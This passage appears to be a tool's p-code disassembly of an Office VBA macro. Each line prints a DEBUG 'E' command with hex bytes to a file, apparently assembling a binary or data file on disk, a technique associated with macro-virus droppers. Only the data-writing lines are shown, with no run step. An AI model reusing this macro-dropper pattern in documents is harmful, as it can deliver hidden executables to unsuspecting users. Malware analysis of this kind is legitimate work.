' 	LitStr 0x0036 "E 40A0 9B D6 89 94 CD 81 8C B8 C3 D0 E6 F3 FF FF 52 F9"
' 	PrintItemNL 
' Line #1229:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 40B0 F1 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 40C0 09 BF BB 00 00 04 00 00 01 00 01 00 06 02 01 07"
' 	PrintItemNL 
' Line #1231:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 40D0 41 3C 09 F7 EF 09 F7 EF 09 F7 EF 0C 4F 4D 16 1F"
' 	PrintItemNL 
' Line #1232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 40E0 22 1A 23 26 23 26 2A 23 28 29 16 57 55 09 F7 EF"
' 	PrintItemNL 
' Line #1233:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 40F0 09 F7 EF 09 F7 EF 09 F7 EF 03 45 47 11 22 2B 25"
' 	PrintItemNL 
' Line #1234:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4100 35 41 35 43 4F 44 53 5C 46 56 5D 44 56 5D 46 59"
' 	PrintItemNL 
' Line #1235:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4110 61 3D 50 5D 4E 62 74 57 6B 7D 62 75 84 38 4A 55"
' 	PrintItemNL 
' Line #1236:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4120 0C 1C 28 15 25 2C 3D 49 4B 00 01 00 00 00 F5 F5"
' 	PrintItemNL 
' Line #1237:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4130 F5 EC EE EE DD E0 DE CC D1 CF C1 C7 C2 B4 BB B6"
' 	PrintItemNL 
' Line #1238:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4140 00 03 00 63 6B 6B 68 6E 73 5D 65 6C 69 70 79 57"
' 	PrintItemNL 
' Line #1239:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4150 60 69 18 BF BC 09 F7 EF 09 F7 EF 1E B8 B5 51 5A"
' 	PrintItemNL 
' Line #1240:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4160 63 5B 61 6C 4E 54 5F 41 47 52 4B 52 5B 46 85 8A"
' 	PrintItemNL 
' Line #1241:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4170 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1242:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4180 F7 EF 26 9F 9E 55 58 5D 4E 51 56 32 36 3B 32 3B"
' 	PrintItemNL 
' Line #1243:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4190 3F 39 42 46 24 66 67 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1244:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 41A0 22 61 61 23 28 2B 00 00 01 35 39 3A F7 F9 F9 F6"
' 	PrintItemNL 
' Line #1245:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 41B0 F8 F8 EC ED EB B5 F2 EE 09 F7 EF 09 F7 EF BB FB"
' 	PrintItemNL 
' Line #1246:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 41C0 F2 F6 FD F8 F1 FA FF D3 DE F9 56 60 8F 65 70 AC"
' 	PrintItemNL 
' Line #1247:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 41D0 80 8E D0 82 92 D4 89 9B D6 87 9A D3 28 DF E7 09"
' 	PrintItemNL 
' Line #1248:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 41E0 F7 EF 2A E1 EA 8E 9D DB 8F A0 D8 22 E7 EB 09 F7"
' 	PrintItemNL 
' Line #1249:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 41F0 EF 09 F7 EF 09 F7 EF 52 C3 E1 8A 9D D6 89 9C D5"
' 	PrintItemNL 
' Line #1250:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4200 84 96 D3 81 90 CE 8C 97 D3 7F 89 B9 97 A1 BF ED"
' 	PrintItemNL 
' Line #1251:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4210 F6 FF 43 F8 F2 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1252:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4220 EF 09 F7 EF 10 C5 C1 00 06 0A 00 04 05 01 04 02"
' 	PrintItemNL 
' Line #1253:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4230 04 00 00 04 01 00 08 C9 C3 09 F7 EF 09 F7 EF 07"
' 	PrintItemNL 
' Line #1254:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4240 93 8F 10 1B 1F 12 1E 20 1A 1F 22 1E 25 28 12 54"
' 	PrintItemNL 
' Line #1255:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4250 55 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 05 4F 52"
' 	PrintItemNL 
' Line #1256:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4260 27 39 44 43 53 60 4D 5B 67 54 63 6C 47 57 5E 47"
' 	PrintItemNL 
' Line #1257:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4270 59 60 4D 60 68 56 69 76 63 77 89 53 67 79 66 79"
' 	PrintItemNL 
' Line #1258:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4280 88 5C 6F 7C 15 27 32 29 39 40 4C 58 5A 00 01 00"
' 	PrintItemNL 
' Line #1259:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4290 00 00 F3 F5 F5 EA EF EE DC E1 DF CB D2 CF BF C6"
' 	PrintItemNL 
' Line #1260:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 42A0 C1 B2 BB B8 00 04 03 67 6F 6F 61 6A 6E 59 60 69"
' 	PrintItemNL 
' Line #1261:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 42B0 5C 65 6F 55 5E 68 16 CC C8 09 F7 EF 09 F7 EF 26"
' 	PrintItemNL 
' Line #1262:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 42C0 A3 A3 55 5B 66 54 5A 65 4F 53 5E 4B 4F 5A 56 5A"
' 	PrintItemNL 
' Line #1263:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 42D0 65 61 66 6F 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1264:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 42E0 09 F7 EF 09 F7 EF 08 72 71 20 25 28 34 37 3B 33"
' 	PrintItemNL 
' Line #1265:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 42F0 38 3B 37 3D 42 2D 33 38 29 69 6B 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1266:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4300 EF 09 F7 EF 1D 5C 5C 07 0C 0F 03 07 08 BB BF C0"
' 	PrintItemNL 
' Line #1267:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4310 FD FF FF E8 EA EA EF F0 EE B4 F1 ED 09 F7 EF 09"
' 	PrintItemNL 
' Line #1268:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4320 F7 EF B4 F5 EE F0 F9 F6 EE F8 FF BE C9 E5 4E 58"
' 	PrintItemNL 
' Line #1269:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4330 88 73 7E BA 7B 89 CB 7C 8D CC 82 95 CE 91 A5 DC"
' 	PrintItemNL 
' Line #1270:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4340 2C E3 EB 09 F7 EF 2A E1 E9 91 A2 DA 8D A1 D1 28"
' 	PrintItemNL 
' Line #1271:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4350 E0 E6 09 F7 EF 09 F7 EF 09 F7 EF 4E CE E6 8E 9F"
' 	PrintItemNL 
' Line #1272:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4360 D7 89 9A D2 89 99 D4 8A 99 D7 86 91 CD 7F 8A BE"
' 	PrintItemNL 
' Line #1273:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4370 7F 88 AD CD D6 EA 35 F9 F2 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1274:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4380 F7 EF 18 EF E8 09 F7 EF 11 C6 C2 00 00 04 00 00"
' 	PrintItemNL 
' Line #1275:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4390 01 00 00 00 04 00 00 06 02 01 08 70 6C 09 F7 EF"
' 	PrintItemNL 
' Line #1276:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 43A0 09 F7 EF 0A C0 BB 18 27 2A 0E 1A 1E 09 12 16 13"
' 	PrintItemNL 
' Line #1277:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 43B0 1C 20 0D 52 53 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1278:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 43C0 EF 0A 54 57 2F 41 4C 51 62 6F 65 75 81 74 83 8C"
' 	PrintItemNL 
' Line #1279:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 43D0 56 66 6D 4C 5C 62 49 5B 62 5B 6D 78 6C 7E 8F 53"
' 	PrintItemNL 
' Line #1280:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 43E0 67 79 4C 5F 6E 6B 7E 8B 3C 4E 59 3D 4F 56 4F 5B"
' 	PrintItemNL 
' Line #1281:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 43F0 5D 00 08 06 00 00 F0 F5 F4 E9 EF EE DA E1 DE CA"
' 	PrintItemNL 
' Line #1282:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4400 D1 CE BE C5 C2 B2 BB B8 00 05 04 66 6F 72 57 5F"
' 	PrintItemNL 
' Line #1283:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4410 66 55 5C 65 57 5F 6C 5D 65 72 0E EE E7 09 F7 EF"
' 	PrintItemNL 
' Line #1284:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4420 09 F7 EF 23 9F A0 60 66 71 4C 52 5F 43 49 56 42"
' 	PrintItemNL 
' Line #1285:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4430 48 53 45 4B 56 4D 54 5D 1A CE CB 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1286:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4440 EF 09 F7 EF 09 F7 EF 09 F7 EF 12 52 52 05 0D 0D"
' 	PrintItemNL 
' Line #1287:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4450 12 17 18 24 29 2A 19 1E 21 03 08 0B 20 5F 5F 09"
' 	PrintItemNL 
' Line #1288:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4460 F7 EF 09 F7 EF 09 F7 EF 16 54 53 00 00 01 78 7C"
' 	PrintItemNL 
' Line #1289:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4470 7D FB FF FF E8 ED EC E3 E8 E7 F3 F5 F5 B5 F3 F1"
' 	PrintItemNL 
' Line #1290:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4480 09 F7 EF 09 F7 EF B8 F8 F3 F7 FF FF EC F5 FF 96"
' 	PrintItemNL 
' Line #1291:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4490 A0 BE 55 5F 8E 7B 87 C1 7D 8C CA 84 96 D1 83 98"
' 	PrintItemNL 
' Line #1292:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 44A0 CC 85 9B CB 2B D6 DF 09 F7 EF 20 D7 DE 66 78 A7"
' 	PrintItemNL 
' Line #1293:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 44B0 61 77 A0 36 B9 C8 09 F7 EF 09 F7 EF 09 F7 EF 2D"
' 	PrintItemNL 
' Line #1294:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 44C0 CA D6 7E 90 BF 8C 9D CE 90 A0 D5 8E 9C D6 8D 9B"
' 	PrintItemNL 
' Line #1295:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 44D0 D6 8E 9A D0 7E 8A B4 94 9F BB 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1296:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 44E0 09 F7 EF 09 F7 EF 36 E9 E6 09 F7 EF 13 C8 C4 00"
' 	PrintItemNL 
' Line #1297:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 44F0 00 04 00 04 05 00 00 00 02 00 00 02 00 00 05 23"
' 	PrintItemNL 
' Line #1298:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4500 22 09 F7 EF 09 F7 EF 09 F7 EF 20 33 38 17 27 2D"
' 	PrintItemNL 
' Line #1299:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4510 0C 18 1E 11 1D 23 15 5B 5F 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1300:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4520 F7 EF 09 F7 EF 16 61 65 39 4C 59 60 71 7E 81 91"
' 	PrintItemNL 
' Line #1301:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4530 9D 87 96 9F 52 62 68 45 55 5B 2F 41 48 34 46 51"
' 	PrintItemNL 
' Line #1302:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4540 51 64 73 56 68 79 3C 51 60 57 6D 79 54 67 74 4A"
' 	PrintItemNL 
' Line #1303:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4550 5B 64 49 55 59 00 04 04 00 00 F0 F6 F5 E9 EF EE"
' 	PrintItemNL 
' Line #1304:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4560 D9 E0 DD C9 D0 CD BF C6 C3 B2 BB B8 00 04 04 64"
' 	PrintItemNL 
' Line #1305:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4570 6D 70 5C 64 6B 5C 63 6C 56 5C 69 56 5E 6B 09 F7"
' 	PrintItemNL 
' Line #1306:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4580 EF 09 F7 EF 09 F7 EF 1B 97 98 53 5B 68 39 41 4E"
' 	PrintItemNL 
' Line #1307:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4590 38 40 4D 3F 47 54 38 41 4B 37 40 4A 28 94 97 09"
' 	PrintItemNL 
' Line #1308:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 45A0 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 3E 72"
' 	PrintItemNL 
' Line #1309:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 45B0 73 28 31 34 12 1B 1E 14 1B 1E 00 00 03 1B 1E 22"
' 	PrintItemNL 
' Line #1310:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 45C0 27 64 65 09 F7 EF 09 F7 EF 09 F7 EF 04 5D 5B 29"
' 	PrintItemNL 
' Line #1311:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 45D0 2D 2E F1 F5 F6 F8 FC FD E2 E7 E6 E2 E7 E6 EA EF"
' 	PrintItemNL 
' Line #1312:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 45E0 EE B4 F3 F1 09 F7 EF 09 F7 EF B5 F6 F3 EB F4 F8"
' 	PrintItemNL 
' Line #1313:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 45F0 D5 DF F0 72 7D 9B 6E 7B A7 87 95 C9 74 85 BD 65"
' 	PrintItemNL 
' Line #1314:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4600 7A AE 44 5B 88 39 52 7A 1C 9E AF 09 F7 EF 1A D2"
' 	PrintItemNL 
' Line #1315:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4610 D5 53 69 8D 62 7C 9A 4B C4 CF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1316:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4620 09 F7 EF 1F D7 DA 58 6B 91 5A 6C 95 64 74 A2 6A"
' 	PrintItemNL 
' Line #1317:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4630 7B AC 7D 8D C2 84 95 C8 7C 8B B9 5F 95 AF 09 F7"
' 	PrintItemNL 
' Line #1318:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4640 EF 09 F7 EF 09 F7 EF 36 F8 F2 3B EF EB 09 F7 EF"
' 	PrintItemNL 
' Line #1319:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4650 0B EB E5 00 01 06 00 01 02 00 00 00 04 02 01 07"
' 	PrintItemNL 
' Line #1320:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4660 05 05 00 01 02 08 CA C4 09 F7 EF 09 F7 EF 30 51"
' 	PrintItemNL 
' Line #1321:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4670 57 37 4A 51 2C 3C 43 24 34 3B 26 6F 74 09 F7 EF"
' 	PrintItemNL 
' Line #1322:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4680 09 F7 EF 09 F7 EF 09 F7 EF 4F 9B A1 5C 71 80 65"
' 	PrintItemNL 
' Line #1323:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4690 78 87 7F 90 9D 6E 7F 88 2B 39 3F 31 40 43 17 27"
' 	PrintItemNL 
' Line #1324:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 46A0 2D 11 22 2B 41 51 61 64 77 86 44 59 68 44 5A 66"
' 	PrintItemNL 
' Line #1325:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 46B0 55 68 75 49 5C 64 41 50 53 00 01 01 00 00 F1 F5"
' 	PrintItemNL 
' Line #1326:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 46C0 F6 E9 EE ED D8 DD DB C9 D0 CD BF C6 C3 B3 BC B9"
' 	PrintItemNL 
' Line #1327:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 46D0 00 02 02 62 69 6C 66 6C 71 59 60 69 4D 53 5E 36"
' 	PrintItemNL 
' Line #1328:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 46E0 76 7C 09 F7 EF 09 F7 EF 09 F7 EF 21 9D 9D 40 49"
' 	PrintItemNL 
' Line #1329:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 46F0 56 2B 34 42 38 41 4E 46 4F 5C 40 49 56 3C 46 50"
' 	PrintItemNL 
' Line #1330:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4700 39 5F 67 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #1331:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4710 F7 EF 35 3F 46 2B 36 3A 1B 26 2A 12 1B 1F 0D 10"
' 	PrintItemNL 
' Line #1332:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4720 14 25 26 2A 04 12 16 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1333:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4730 10 89 85 99 9B 9C FB FF FF D8 DC DD DA DE DF DD"
' 	PrintItemNL 
' Line #1334:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4740 E1 E2 E1 E5 E6 B2 F2 F0 09 F7 EF 09 F7 EF B7 F8"
' 	PrintItemNL 
' Line #1335:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4750 F8 E8 F1 FA CD D6 EA 65 70 8E 61 6F 99 52 62 90"
' 	PrintItemNL 
' Line #1336:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4760 2E 41 6E 17 2D 56 18 31 53 40 5A 78 3B BE C8 09"
' 	PrintItemNL 
' Line #1337:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4770 F7 EF 28 E1 E2 52 6B 85 1B 39 4C 0A 5E 68 09 F7"
' 	PrintItemNL 
' Line #1338:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4780 EF 09 F7 EF 09 F7 EF 1C EF EC 93 A6 C1 77 89 A8"
' 	PrintItemNL 
' Line #1339:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4790 63 76 97 5E 71 96 55 6A 97 5F 73 A2 66 79 A6 40"
' 	PrintItemNL 
' Line #1340:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 47A0 A5 B9 09 F7 EF 09 F7 EF 09 F7 EF 4F F3 F0 38 EA"
' 	PrintItemNL 
' Line #1341:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 47B0 E7 09 F7 EF 09 F7 EF 01 10 14 00 00 01 00 00 00"
' 	PrintItemNL 
' Line #1342:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 47C0 03 01 01 02 00 00 04 06 07 05 8C 89 09 F7 EF 09"
' 	PrintItemNL 
' Line #1343:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 47D0 F7 EF 39 86 8A 4E 63 6B 44 57 5F 3A 4C 57 1F 69"
' 	PrintItemNL 
' Line #1344:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 47E0 70 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 4D 9B A2"
' 	PrintItemNL 
' Line #1345:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 47F0 48 5D 6C 49 5C 6B 70 81 8E 55 65 71 0A 18 1E 1E"
' 	PrintItemNL 
' Line #1346:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4800 2D 30 0B 1B 21 14 26 2D 48 58 65 5F 6F 7F 45 5A"
' 	PrintItemNL 
' Line #1347:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4810 69 50 67 76 5A 70 7C 46 59 61 38 47 4A 00 01 01"
' 	PrintItemNL 
' Line #1348:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4820 00 00 F3 F5 F6 E8 EC ED D9 DB DB C9 CE CC C1 C6"
' 	PrintItemNL 
' Line #1349:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4830 C4 B5 BC B9 00 01 00 60 68 68 60 66 6B 4A 50 57"
' 	PrintItemNL 
' Line #1350:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4840 47 4C 55 2C 8A 8D 09 F7 EF 09 F7 EF 09 F7 EF 30"
' 	PrintItemNL 
' Line #1351:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4850 AC AC 43 4D 57 29 35 41 33 3D 47 3B 45 4F 34 3E"
' 	PrintItemNL 
' Line #1352:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4860 48 35 3F 49 37 41 4B 12 D6 D1 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #1353:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4870 09 F7 EF 0C DE D9 1A 24 2B 1E 28 2F 1E 28 2F 18"
' 	PrintItemNL 
' Line #1354:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4880 21 25 1A 1B 1F 00 00 03 1C 1B 1F 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #1355:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4890 EF 09 F7 EF 75 EE EA FD FF FF ED EF F0 ED F1 F2"
' 	PrintItemNL 
' Line #1356:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 48A0 D1 D5 D6 DC E0 E1 E2 E7 E8 B2 F2 F1 09 F7 EF 09"
' 	PrintItemNL 
' Line #1357:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 48B0 F7 EF B3 F5 F8 DC E5 F2 B0 BB D1 38 43 61 13 23"
' 	PrintItemNL 
' Line #1358:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 48C0 48 00 12 38 13 29 4D 35 4E 6E 72 8D A8 8A A6 BE"
' 	PrintItemNL 
' Line #1359:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 48D0 44 C9 D1 09 F7 EF 13 CC CC 1D 38 4D 16 31 45 1D"
' 	PrintItemNL 
' Line #1360:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 48E0 48 58 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 6E 80"
' 	PrintItemNL 
' Line #1361:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 48F0 97 87 99 B0 7F 92 AD 6C 81 A0 63 7B 9F 55 6E 96"
' 	PrintItemNL 
' Line #1362:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4900 49 61 8B 20 BD C7 09 F7 EF 09 F7 EF 09 F7 EF 72"
' 	PrintItemNL 
' Line #1363:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4910 EB EB 74 EB ED 09 F7 EF 09 F7 EF 54 A1 A1 60 5F"
' 	PrintItemNL 
' Line #1364:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 4920 61 49 49 49 27 25 25 00 00 01 00 00 03 03 4E 4E"
